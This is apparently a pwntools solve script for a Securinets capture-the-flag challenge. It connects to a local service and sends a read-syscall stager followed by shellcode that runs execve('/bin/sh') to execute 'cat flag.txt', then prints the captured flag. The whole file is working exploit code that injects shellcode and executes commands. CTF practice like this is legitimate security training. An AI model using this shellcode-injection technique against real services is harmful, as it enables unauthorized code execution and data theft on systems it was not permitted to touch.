#!/usr/bin/env python3
from pwn import *

context.arch = "amd64"
context.log_level = "error"

io = remote("127.0.0.1", 9008)

stager = asm("xor eax, eax; syscall")
shellcode = asm(shellcraft.execve("/bin/sh", ["sh", "-c", "cat flag.txt"], 0))
second_stage = b"A" * 4 + shellcode

io.sendafter(b"FIRST FRAGMENT: ", stager + second_stage)
io.recvuntil(b"Securinets{")
flag = b"Securinets{" + io.recvuntil(b"}")
print(flag.decode())
io.close()
